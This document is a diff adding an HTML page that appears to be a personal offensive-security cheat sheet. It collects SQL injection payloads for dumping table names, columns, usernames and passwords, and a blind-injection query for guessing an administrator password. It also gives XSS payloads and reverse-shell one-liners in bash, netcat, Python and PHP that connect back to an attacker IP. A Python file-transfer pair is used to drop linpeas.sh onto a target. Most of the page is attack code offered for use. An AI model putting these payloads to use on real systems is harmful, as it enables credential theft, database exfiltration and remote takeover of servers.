@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/styles/miscStyles.css">
+    <link href="/styles/prism/prism.css" rel="stylesheet"/>
+    <script src="/styles/prism/prism.js"></script>
+    <link rel="icon" type="image/x-icon" href="/images/favicon.png">
+
+    <title>Minimalist Webpage</title>
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/components/navbar.js"></script>
+    
+    <div id="navbar-container"></div>
+    <div class="main-container">
+        <div class="sidebar">
+            <h3>Quick content</h3>
+            <ul id="sidebar-menu"></ul>
+        </div>
+
+        <div class="notion-container">
+            <div class="notion-header">
+                <h1 id="OWASP TOP 10">OWASP TOP 10</h1>
+            </div>
+                <!-- SQL injection -->
+                <div class="notion-body">
+                    <h2>SQL injection</h2>
+                        <p> Basic payloads</p>
+                        <pre><code class="language-sql">'+OR+1=1--
+' OR 1=1; --
+' OR '1'='1
+" OR "1"="1" --
+' OR 1=1 --
+' --</code></pre>
+                <h3> Microsoft, PostgreSQL, MySQL </h3>            
+                <h4> Show all database tables</h4>
+                <pre><code class="language-sql">'+UNION+SELECT+table_name,null+FROM+information_schema.tables--</code></pre>
+                <h4> Show columns of a specific table </h4>
+                <pre><code class="language-sql">'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--</code></pre>
+                <h4> Show data of a table </h4>
+                <pre><code class="language-sql">'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--</code></pre>
+
+                <h3> Oracle  </h3>            
+                <h4> Show all database tables   </h4>
+                <pre><code class="language-sql">'+UNION+SELECT+table_name,null+FROM+all_tables--</code></pre>
+                <h4> Show columns of a specific table </h4>
+                <pre><code class="language-sql">'+UNION+SELECT+column_name,null+FROM+all_tab_columns+WHERE+table_name=%27USERS_LRGIXZ%27--</code></pre>
+                <h4> Show data of a table </h4>
+                <pre><code class="language-sql">%27+UNION+SELECT+USERNAME_TTKTKD,PASSWORD_ABIXLF+FROM+USERS_LRGIXZ--</code></pre>
+
+                <h3> Blind SQL injection </h3>
+                Rememer to intercept the requests since in this case the injection has been made in the cookie.
+                In this case it has been detected that if the query was valid a string was displayed on the screen.
+                To check if a table exists we can use the following command
+                <pre><code class="language-sql">' AND (SELECT 'a' FROM users LIMIT 1)='a</code></pre>
+                We used the following query to check letter by letter the password
+                <pre><code class="language-sql">' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</code></pre>
+                
+                <h3> Situations</h3>
+                It is possible that to determine which parameter is injectable within the union we have to
+                insert text in any of them trying the following way. If we can make it not jump
+                no error would mean that this parameter is injectable   
+                <pre><code class="language-sql">'+UNION+SELECT+NULL+'text'--</code></pre>
+               
+                
+                <!-- XSS -->    
+                </div>
+                <div class="notion-body">
+                    <h2>XSS</h2>
+                    <h3>Links of interes</h3>
+                    <ul>
+                        <li> <a class="notion-link" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#other-useful-attributes"> XSS Cheatsheet</a> <br> </li>
+                        <li> <a class="notion-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md"> Payload all the things</a></li>
+                    </ul>
+                    
+                    <h3>Common payloads</h3>
+                    <pre><code class="language-js">&lt;script&gt; alert('') &lt;/script&gt;</code></pre>
+                    <pre><code class="language-js">&lt;img src =q onerror=alert()&gt;</code></pre>
+                    <pre><code class="language-js">&lt;link&gt; rel="stylesheet" href="javascript:alert('');"&gt;</code></pre>
+                    
+                    <h3>Situations</h3>
+                    
+                    In case you find that parameters are passed through the URL you can try adding a new parameter and injecting the code there since it is not sanitized. 
+                    Here what has been done is to close the select and inject the code there.
+                    <pre><code class="language-js">https://URL.com/product?productId=2&storeId=&lt;/select&gt;&lt;svg onload=alert(1)&gt;</code></pre>
+
+                    <p> Avoiding WAF</p>
+                    In other situations where the WAF blocks most of the tags, a brute force attack can be carried out to try the tags that are allowed. In the links above you will find a list of tags and attributes.
+                </div>
+            
+            <div class="notion-header">
+                <h1 id="Webshells">Webshells</h1>
+                <ul>
+                    <li> <a class="notion-link" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"> Pentest Monkey - Webshells</a></li>
+                </ul>
+                <h2>Bash</h2>
+                <pre><code class="language-bash">bash -i >& /dev/tcp/TU_IP/TU_PUERTO 0>&1</code></pre>
+                <pre><code class="language-bash">nc -e /bin/sh 10.0.0.1 1234</code></pre>
+                <h2>Python</h2>
+                <pre><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))</code></pre>
+                <h2>PHP</h2>
+                <pre><code class="language-php">php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</code></pre>
+
+            </div>    
+                
+            <div class="notion-header">
+                <h1 id="Python">Python</h1>
+                <h2> Transferencia de archivos con python </h2>
+                <h3> Servidor </h3>
+                <pre><code class="language-python">python3 -c "
+import socket
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
+    server_socket.bind(('10.8.0.22', 7777))
+    server_socket.listen(1)
+    conn, addr = server_socket.accept()
+    print(f'Conexión desde {addr}')
+    with conn, open('/home/kali/github/file.sh', 'rb') as file:
+        while (data := file.read(1024)):
+            conn.sendall(data)
+    print('Archivo enviado con éxito.')"</code></pre>
+                <h3> Cliente </h3>
+                <pre><code class="language-python">python3 -c "
+import socket
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+    client_socket.connect(('10.8.0.22', 7777))
+    print('Conectado al servidor.')
+    with open('/var//linpeas.sh', 'wb') as file:
+        while True:
+            data = client_socket.recv(1024)
+            if not data:
+                break
+            file.write(data)
+    print('Archivo recibido con éxito y guardado como archivo_recibido.txt.')"</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mover el script al final del body para asegurar que todo el DOM esté cargado -->
+    <script>
+        
+        function generateMenu(){
+            const headers = document.querySelectorAll('.notion-container h1');
+            const sidebarList = document.querySelector('#sidebar-menu');
+
+            headers.forEach(header => {
+                const listItem = document.createElement('li');
+                const link = document.createElement('a');
+                link.textContent = header.textContent;
+                link.setAttribute('href', `#${header.textContent}`);
+                listItem.appendChild(link);
+                sidebarList.appendChild(listItem);
+            });
+        }
+
+        // Asegurarse de que ambas funciones se ejecuten después de que todo el contenido esté listo
+        window.addEventListener('load', generateMenu);
+    </script>
+</body>
+</html>
